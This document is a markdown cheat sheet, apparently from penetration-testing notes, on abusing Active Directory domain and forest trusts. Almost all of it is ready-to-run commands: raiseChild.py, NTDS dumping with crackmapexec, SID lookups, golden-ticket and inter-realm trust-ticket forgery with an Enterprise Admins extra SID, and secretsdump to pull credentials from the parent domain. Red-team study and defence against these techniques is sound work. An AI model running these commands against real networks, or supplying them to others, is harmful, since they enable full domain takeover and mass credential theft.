# Trusts

## Domain Trust - child/parent

### Enumerate the trusts

![Alt text](/Images/image-14.png)

```bash
# LDAP
ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP trusts
# Bloodhound
MATCH p=(n:Domain)-->(m:Domain) RETURN p
```

### Exploiting

#### Fast exploitation

```bash
# Get the Administrator Hash and you can use with crackmapexec to domain
python3 raiseChild.py domain.com/user:'Pass'
```

#### Step by step 


```bash
# Get hash krbtgt user on domain
crackmapexec smb dcIP -u 'admin' -p 'pass' --ntds
# dump child domain SID 
lookupsid.py  -domain-sids domain.com/user:'Pass'@childDomainIP 0
# dump parent domain SID 
lookupsid.py  -domain-sids domain.com/user:'Pass'@parentDomainIP 0
# Create golden ticket
ticketer.py -nthash <hash krbtgt> \
 -domain-sid <sid child domain> \
 -domain domain.com \
 -extra-sid <sid parent domain>-519 \
 goldenuser
# Dump credentials
secretsdump -k -no-pass -just-dc-ntlm domain.com/goldenuser@dc.parentDomain.com
```

#### Trust ticket - forge inter-realm TGT

```bash
# Get trust key
secretsdump -just-dc-user 'NETBIOSPCPARENTDOMAIN$' domain.com/user:'Pass'@dcIP
# Get Ticket
ticketer.py -nthash <hash NETBIOSPCPARENTDOMAIN$>  \
 -domain-sid <sid child domain> \
 -domain domain.com \
 -extra-sid <sid parent domain>-519 \
 -spn krbtgt/parentdomain.local trustfakeuser

export KRB5CCNAME=/path/to/trustfakeuser.ccache   
getST.py -k -no-pass -spn cifs/dc.parentdomain.local domain.com/trustfakeuser@parentDomain.com -debug
export KRB5CCNAME=/path/to/trustfakeuser@parentdomain.local@cifs_dc.parentdomain.local@parentdomain.local.ccache
secretsdump -k -no-pass -just-dc-ntlm trustfakeuser@dc.parentdomain.local
```

## Forest Trust 

### Enumerate

```c
MATCH p = (a:Domain)-[:Contains*1..]->(x)-->(w)-->(z)<--(y)<-[:Contains*1..]-(b:Domain) where (x:Container or x:OU) and (y:Container or y:OU) and (a.name <>b.name) and (tolower(w.samaccountname) <> "enterprise admins" and tolower(w.samaccountname) <> "enterprise key admins" and tolower(z.samaccountname) <> "enterprise admins" and tolower(z.samaccountname) <> "enterprise key admins")  RETURN p
```

### Abuse

1. Password reuse
2. Abuse ACL
3. Unconstrained delegation
4. MSSQL Trusted Link
5. Golden ticket same as child/parent



#### Refernces 

- https://mayfly277.github.io/posts/GOADv2-pwning-part12/
- https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d
- https://adsecurity.org/?p=1640